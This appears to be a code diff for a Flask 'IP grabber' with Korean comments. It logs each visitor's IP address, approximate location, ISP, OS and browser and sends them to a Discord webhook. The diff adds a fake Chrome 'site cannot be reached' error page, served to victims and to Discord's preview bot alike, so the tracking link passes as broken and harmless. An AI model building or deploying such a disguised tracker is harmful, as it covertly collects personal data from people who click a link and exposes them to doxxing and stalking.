@@ -15,16 +15,79 @@ DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3
 TARGET_URL = "https://weao.xyz"
 last_status = None
 
-# 🔥 미리보기 없는 순수 빈 HTML (OG 태그 제거)
-NO_PREVIEW_HTML = """
+# 🔥 크롬 에러 페이지 위장 HTML (요청한 링크 삽입 완료)
+ERROR_PAGE_HTML = """
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
     <meta charset="utf-8">
-    <title>Loading...</title>
+    <title>사이트에 연결할 수 없음</title>
+    <style>
+        body {
+            background-color: #202124;
+            color: #bdc1c6;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            padding: 40px;
+        }
+        .icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #f1f3f4;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 16px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+        a {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .error-code {
+            font-size: 12px;
+            color: #9aa0a6;
+            margin-top: 24px;
+        }
+        .reload-btn {
+            background-color: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .reload-btn:hover {
+            background-color: #aecbfa;
+        }
+    </style>
 </head>
-<body style="background-color: #111; color: #fff; text-align: center; padding-top: 50px;">
-    <h2>로딩 중입니다...</h2>
+<body>
+    <div class="container">
+        <div class="icon">📄</div>
+        <h1>사이트에 연결할 수 없음</h1>
+        <p><a href="https://server-ixra.onrender.com/?youtube.com" target="_blank">https://server-ixra.onrender.com/?youtube.com</a>에 오타가 있는지 확인하세요.</p>
+        <p>철자가 올바르다면 <a href="#">Windows 네트워크 진단</a>을 실행해 보세요.</p>
+        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
+        <button class="reload-btn" onclick="location.reload()">새로고침</button>
+    </div>
 </body>
 </html>
 """
@@ -61,15 +124,15 @@ def monitor_potassium():
             
         time.sleep(60)
 
-# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + 미리보기 없음)
+# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + 크롬 에러 페이지 리턴)
 @app.route('/')
 def catch_ip():
     user_agent = request.headers.get('User-Agent', 'N/A')
     
-    # 디스코드 미리보기 봇이 올 때는 메타태그가 없는 기본 페이지만 던져줌으로써 미리보기 차단
+    # 디스코드 미리보기 봇이 올 때는 미리보기 없도록 에러 페이지 던짐
     if "Discordbot" in user_agent:
-        print("[!] 디스코드 봇 차단 (미리보기 안 뜸)")
-        return render_template_string(NO_PREVIEW_HTML)
+        print("[!] 디스코드 봇 차단")
+        return render_template_string(ERROR_PAGE_HTML)
 
     if request.headers.get('X-Forwarded-For'):
         user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -118,7 +181,7 @@ def catch_ip():
     # UptimeRobot 같은 핑 봇은 차단
     if os_info == "기타 OS" and browser_info == "기타 브라우저":
         print(f"[!] 핑 봇 접속 차단됨 (IP: {user_ip})")
-        return render_template_string(NO_PREVIEW_HTML)
+        return render_template_string(ERROR_PAGE_HTML)
 
     # IP 주소로 대략적인 지역 및 통신사 조회 (ip-api 이용)
     location_info = "조회 불가"
@@ -145,7 +208,7 @@ def catch_ip():
                 "fields": [
                     {"name": "IP 주소", "value": f"`{user_ip}`", "inline": True},
                     {"name": "시간", "value": f"`{timestamp}`", "inline": True},
-                    {"name": "지역/통신사", "value": f"`location_info`", "inline": False},
+                    {"name": "지역/통신사", "value": f"`{location_info}`", "inline": False},
                     {"name": "운영체제", "value": f"`{os_info}`", "inline": True},
                     {"name": "브라우저", "value": f"`{browser_info}`", "inline": True}
                 ]
@@ -158,7 +221,7 @@ def catch_ip():
     except Exception as e:
         print(f"[!] 디스코드 웹훅 에러 발생 : {e}")
     
-    return render_template_string(NO_PREVIEW_HTML)
+    return render_template_string(ERROR_PAGE_HTML)
 
 if __name__ == '__main__':
     # 백그라운드 포타슘 감시 스레드 실행
